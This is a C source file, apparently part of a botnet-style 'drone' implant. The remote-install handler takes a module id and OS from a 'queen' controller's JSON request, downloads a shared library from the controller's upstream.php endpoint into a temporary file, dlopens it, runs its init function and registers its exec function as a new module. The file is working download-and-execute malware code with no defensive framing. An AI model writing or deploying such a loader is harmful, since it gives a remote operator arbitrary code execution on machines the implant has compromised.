#include <dlfcn.h> 
#include "common.h"
#include <string.h> 
#include "cJSON.h"
#include <unistd.h>
#include "hyp_conn_queen.h"
#include "hyp_stream_queue.h"
#include "exec_thread.h"
#include "hyp_mod_func.h"

int mod_drone(const char *buff){
	REQUEST_HEADER * Buf = (REQUEST_HEADER *)buff;

    char result[6] = {0x24, 0x63, 0x3D, 0x31, 0x04,0x00};
    response_sender(Buf, 6, (char *)&result);


	return 0;
}

int mod_remote_install(const char *buff){
    REQUEST_HEADER * Buf = (REQUEST_HEADER *)buff;

    debug_msg ("Mod.exec: request len: %i contents: %s  addr: %p \n",Buf->RDataSize,(char *)Buf->RData,Buf->RData);
	debug_msg ("Mod.exec: request ID: %.*s \n",32,Buf->Tid);
	debug_msg ("Mod.exec: ExecFunc: %p \n",Buf->ExecCallFunc);
	debug_msg ("Mod.exec: cJSON_GetObjectItem: %p \n",Buf->cJSON_GetObjectItem);
	debug_msg ("Mod.exec: lpJsonRoot: %p \n",Buf->lpJsonRoot);

    char * lp_new_mid = 0;
	char * lp_os      = 0;

    //char result[41] = {0x24,0x72, 0x3D, 0x31, 0x04}; //$r=1 $m=

	char result[41] = {
		0x24, 0x72, 0x3D, 0x31, 0x04, 0x24, 0x6D, 0x3D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
     };
    cJSON * jsonRoot = 0;
	
    cJSON * (* cJSON_GetObjectItem) (cJSON *object,const char *string);
    cJSON_GetObjectItem = Buf->cJSON_GetObjectItem;
    if (Buf->lpJsonRoot){		 		
		jsonRoot = Buf->lpJsonRoot;

		cJSON * data = cJSON_GetObjectItem(jsonRoot,"new_mid");
		if ((data)&&(data->valuestring)){
			lp_new_mid = data->valuestring;
		}		
		data = cJSON_GetObjectItem(jsonRoot,"os");
		if ((data) && (data->valuestring)){
			lp_os = data->valuestring;
		}		
	}

    if ((lp_new_mid) && (lp_os)){

		result[3] = 0x32;

		strncat (result,lp_new_mid,32);
		result[40] = 0x04;

       // if (pos_modulelist(DroneModuleList,(uint32_t *)lp_new_mid)){ //mod exists , need (char *)lp_new_mid => uint32_t[4] first
		//	debug_msg ("*** already exists new mid: %s\n",lp_new_mid);
		//    result[3] = 0x35;
		//}else{    
			char buf[1024];

			sprintf (buf,"%s""upstream.php?mid=%s&os=%s",QueenHostDir,lp_new_mid,lp_os);

			debug_msg ("*** new mid: %s os: %s url:%s\n",lp_new_mid,lp_os,buf);

			char * tmpFileName = tempnam(0,0);
			if (tmpFileName){
				debug_msg ("Temporary file name is: %s\n",tmpFileName);			

				FILE * handle = fopen(tmpFileName,"wb");
				if (handle){	
					result[3] = 0x33;
					HYP_CONN_QUEEN_SOCKET send_hcqs;
					if (0 == hyp_conn_queen_init(buf,0,0,&send_hcqs,1)){
						int i = 1;
						do{
							i = hyp_conn_queen_read(&send_hcqs,(char *)&buf,1024);
							if (i > 0){
								fwrite (buf , sizeof(char), i, handle);
							}
							debug_msg ("i = %i\n",i);
						}while (i > 0);
						hyp_conn_queen_close(&send_hcqs);
					}
					fclose(handle);
					int a = mod_loc_loader(tmpFileName);
					if (0 == a){
						result[3] = 0x30;
                    }else if (1 == a){
						result[3] = 0x36;
					}else{
						result[3] = 0x34;
					}
				}
				unlink(tmpFileName);
				free (tmpFileName);
			}else{
				debug_msg ("fail: Temporary file name return 0 \n");
			}
	//	}

	}
	
    response_sender(Buf, 41, (char *)&result);

	return 0;
}

void * pos_modulelist(MODULE_LIST * moduleList,uint32_t * mid){
	void * ret = 0;
    while ((0 != moduleList->Module_NO[0]) || (0 != moduleList->Module_NO[1]) || (0 != moduleList->Module_NO[2]) || 
		   (0 != moduleList->Module_NO[3])){
		if (0 == memcmp(&(moduleList->Module_NO[0]),mid,16)){
			ret = moduleList->Module_Func;
			break;
		}
		moduleList ++;             		
	}
	return ret;
}

int mod_loc_loader(char * soName){
	int ret = -1;
	char *error;
    void * (*init) (char *);
	void * funcAddr = 0;
	uint32_t mid[4];
	void * handle = dlopen (soName, RTLD_LAZY);  
	if (handle) {    
		init = dlsym(handle, "init");  
		if ((error = dlerror()) != NULL)  {  
			dlclose(handle);			
		}else{
			funcAddr = dlsym(handle, "exec");  
			if ((error = dlerror()) != NULL)  {  
				dlclose(handle);
			}else{						
				void * j = init ((char *)mid);
				if (0 == j){
					ret = mod_insert_list(DroneModuleList,(uint32_t *)&mid,funcAddr,handle);
				}else if ((void *)-1 == j){ //reject load
                    ret = -1;
				}else{
				    DroneStatus = -9;
					newDroneModuleList = j;
                    newDroneExec = * ((void **)&mid);
					ret = 1;
				}
			}
		}
	}
	return ret;
}

int mod_insert_list(MODULE_LIST * moduleList,uint32_t * mid,void * funcAddr,void * baseAddr){
	int ret = -1;
    size_t remained = DroneModuleListBuffSize;
    while (remained > sizeof(moduleList)){
        if ((0 == moduleList->Module_Func) \
			&& (0 == moduleList->Module_NO[0]) && (0 == moduleList->Module_NO[1]) \
			&& (0 == moduleList->Module_NO[2]) && (0 == moduleList->Module_NO[3])){
			memcpy(moduleList,mid,4*4);
			moduleList->Module_Func = funcAddr;
			moduleList->Module_Base = baseAddr;
			ret = 0;
			break;
        }
		remained -= sizeof(moduleList);
		moduleList ++;
    }
	return ret;

}